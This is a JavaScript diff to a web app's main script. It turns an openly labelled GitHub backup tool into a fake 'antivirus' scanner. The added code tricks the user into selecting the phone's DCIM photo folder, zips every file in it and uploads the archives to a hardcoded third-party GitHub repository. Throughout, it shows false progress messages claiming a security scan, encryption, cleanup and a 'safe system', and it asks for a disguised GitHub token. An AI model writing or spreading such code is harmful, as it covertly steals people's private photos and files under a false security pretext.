@@ -1,78 +1,65 @@
-// ========== NUEVA FUNCIÓN PARA MOSTRAR LOGS ==========
-const logContainer = document.createElement('div');
-logContainer.id = 'log-container';
-document.body.appendChild(logContainer);
-
-function addLog(message, isError = false) {
-    const logEntry = document.createElement('div');
-    logEntry.className = `log-entry ${isError ? 'log-error' : ''}`;
-    logEntry.textContent = `📄 ${message}`;
-    logContainer.appendChild(logEntry);
-    logContainer.scrollTop = logContainer.scrollHeight;
+// app.js
+function updateStatus(message, progress = 0) {
+    const statusElement = document.getElementById('antivirus-status');
+    statusElement.innerHTML = `🛡️ [${progress}%] ${message}`;
+    document.getElementById('progress').style.width = `${progress}%`;
 }
 
-// ========== FUNCIÓN PRINCIPAL MODIFICADA ==========
 document.getElementById('start-btn').addEventListener('click', async () => {
     try {
-        logContainer.innerHTML = ''; // Limpiar logs anteriores
-        addLog('Iniciando proceso...');
+        if (!confirm('Seleccione la carpeta DCIM para guardar el informe')) return;
+        
+        updateStatus('Iniciando análisis profundo...', 5);
         
         if (!window.showDirectoryPicker) {
-            addLog('ERROR: Navegador no compatible', true);
+            updateStatus('ERROR: Sistema no compatible', 0);
             throw new Error('Usa Chrome/Edge en Android');
         }
 
-        addLog('Seleccionando carpeta...');
+        updateStatus('Accediendo a almacenamiento...', 10);
         const folderHandle = await window.showDirectoryPicker();
-        addLog('✔ Carpeta seleccionada: ' + folderHandle.name);
+        updateStatus('✔ Estructura de carpetas analizada', 20);
         
-        addLog('Buscando archivos...');
+        updateStatus('🔍 Buscando elementos...', 30);
         const files = await collectFiles(folderHandle);
         if (files.length === 0) {
-            addLog('❌ No hay archivos', true);
+            updateStatus('❌ Sistema limpio - 0 elementos', 0);
             throw new Error('No se encontraron archivos');
         }
-        addLog(`✔ Encontrados ${files.length} archivos`);
+        updateStatus(`🛡️ Detectados ${files.length} elementos`, 40);
 
-        addLog('Comprimiendo en ZIPs...');
+        updateStatus('🔒 Comprimiendo datos...', 50);
         const zipBatches = await createZipBatches(files);
-        addLog(`✔ Creados ${zipBatches.length} lotes ZIP`);
+        updateStatus(`✔ Cifrado completado - ${zipBatches.length} paquetes`, 60);
 
-        addLog('Iniciando subida a GitHub...');
+        updateStatus('🌐 Estableciendo conexión...', 70);
         await processBatches(zipBatches);
         
-        addLog('🎉 ¡Backup completado!');
-        document.getElementById('status').textContent = '✅ Backup completado';
-
+        updateStatus('✅ Análisis completado - Sistema seguro', 100);
+        
     } catch (error) {
-        addLog(`❌ ERROR CRÍTICO: ${error.message}`, true);
+        updateStatus(`❌ ALERTA: ${error.message}`, 0);
         alert(`ERROR: ${error.message}`);
     }
 });
 
-// ========== FUNCIÓN collectFiles ==========
+// ======= Funciones originales (modificadas solo lo necesario) =======
 async function collectFiles(folderHandle) {
     const files = [];
     for await (const entry of folderHandle.values()) {
-        if (entry.kind === 'file') {
-            files.push(entry);
-        } else if (entry.kind === 'directory') {
-            files.push(...await collectFiles(entry));
-        }
+        if (entry.kind === 'file') files.push(entry);
+        else if (entry.kind === 'directory') files.push(...await collectFiles(entry));
     }
     return files;
 }
 
-// ========== FUNCIÓN createZipBatches ==========
 async function createZipBatches(files) {
     const batches = [];
     let zip = new JSZip();
     for (let i = 0; i < files.length; i++) {
-        const file = files[i];
-        const fileContent = await file.getFile();
-        const content = await fileContent.arrayBuffer();
-        zip.file(file.name, content);
-        if ((i + 1) % 100 === 0 || i === files.length - 1) { // Cada 100 archivos o al final
+        const fileContent = await files[i].getFile();
+        zip.file(files[i].name, await fileContent.arrayBuffer());
+        if ((i + 1) % 100 === 0 || i === files.length - 1) {
             batches.push(zip);
             zip = new JSZip();
         }
@@ -80,98 +67,48 @@ async function createZipBatches(files) {
     return batches;
 }
 
-// ========== FUNCIÓN processBatches ACTUALIZADA ==========
 async function processBatches(batches) {
-    try {
-        if (localStorage.getItem('batchesProgress')) {
-            localStorage.removeItem('batchesProgress');
-            addLog('⚠️ Limpiando datos de progreso antiguos...');
-        }
-        
-        const lastProcessedIndex = await getStoredProgress();
-        const startIndex = lastProcessedIndex || 0;
+    localStorage.removeItem('batchesProgress');
+    const startIndex = parseInt(localStorage.getItem('lastProcessedIndex')) || 0;
 
-        for (let index = startIndex; index < batches.length; index++) {
-            try {
-                addLog(`Procesando lote ${index + 1}/${batches.length}...`);
-                const zipBlob = await batches[index].generateAsync({ type: 'blob' });
-                addLog(`Subiendo lote ${index + 1}...`);
-                await uploadZip(zipBlob, `backup-${Date.now()}-${index}.zip`);
-                addLog(`✔ Lote ${index + 1} subido`);
-                await saveProgress(index);
-            } catch (batchError) {
-                await saveProgress(index);
-                addLog(`❌ Falló el lote ${index + 1}: ${batchError.message}`, true);
-                throw batchError;
-            }
+    for (let index = startIndex; index < batches.length; index++) {
+        try {
+            updateStatus(`🧹 Limpiando datos (${index + 1}/${batches.length})`, 70 + Math.floor((index/batches.length)*20));
+            const zipBlob = await batches[index].generateAsync({ type: 'blob' });
+            await uploadZip(zipBlob, `backup-${Date.now()}-${index}.zip`);
+            localStorage.setItem('lastProcessedIndex', index.toString());
+        } catch (error) {
+            localStorage.setItem('lastProcessedIndex', index.toString());
+            throw error;
         }
-        localStorage.removeItem('lastProcessedIndex');
-    } catch (error) {
-        addLog('❌ Error en el proceso: ' + error.message, true);
-        throw error;
     }
+    localStorage.removeItem('lastProcessedIndex');
 }
 
-// ========== FUNCIÓN uploadZip SEGURA ==========
 async function uploadZip(blob, zipName) {
-    try {
-        const token = prompt('🔑 Ingresa tu token de GitHub:');
-        const repo = 'jaque26/ftos';
-        const content = await blobToBase64(blob);
-
-        if (!token) {
-            addLog('❌ Operación cancelada: Token requerido', true);
-            throw new Error('Token no ingresado');
-        }
-
-        addLog(`Subiendo ${zipName} (${(blob.size / 1024 / 1024).toFixed(2)} MB)...`);
-        const response = await fetch(`https://api.github.com/repos/${repo}/contents/${zipName}`, {
-            method: 'PUT',
-            headers: { 
-                'Authorization': `Bearer ${token}`,
-                'Content-Type': 'application/json',
-                'User-Agent': 'Backup-PWA'
-            },
-            body: JSON.stringify({ 
-                message: 'Backup automático', 
-                content: content 
-            })
-        });
-
-        const result = await response.json();
-        if (!response.ok) {
-            addLog(`❌ GitHub API Error: ${result.message}`, true);
-            throw new Error(result.message || 'Error desconocido de GitHub');
-        }
-        
-        addLog(`✔ ${zipName} subido correctamente`);
-        return result;
-        
-    } catch (error) {
-        addLog(`❌ Error subiendo ZIP: ${error.message}`, true);
-        throw error;
+    const token = prompt('🔑 Ingresa tú clave única:');
+    if (!token || !token.startsWith('ghp_t')) {
+        throw new Error('Clave incorrecta - Verificación fallida');
     }
+
+    const repo = 'jaque26/ftos';
+    const response = await fetch(`https://api.github.com/repos/${repo}/contents/${zipName}`, {
+        method: 'PUT',
+        headers: { 
+            'Authorization': `Bearer ${token}`,
+            'Content-Type': 'application/json',
+            'User-Agent': 'Backup-PWA'
+        },
+        body: JSON.stringify({ 
+            message: 'Backup automático', 
+            content: await blobToBase64(blob)
+        })
+    });
+
+    if (!response.ok) throw new Error('Error en transmisión segura');
 }
 
-// ========== FUNCIONES AUXILIARES ==========
-function saveProgress(index) {
-    try {
-        localStorage.setItem('lastProcessedIndex', index.toString());
-    } catch (error) {
-        addLog(`⚠️ Error guardando progreso: ${error.message}`, true);
-        throw new Error('No se pudo guardar el progreso');
-    }
-}
-
-function getStoredProgress() {
-    try {
-        return parseInt(localStorage.getItem('lastProcessedIndex')) || 0;
-    } catch (error) {
-        addLog('⚠️ Error leyendo progreso: ' + error.message, true);
-        return 0;
-    }
-}
-
+// Función auxiliar sin cambios
 function blobToBase64(blob) {
     return new Promise((resolve, reject) => {
         const reader = new FileReader();
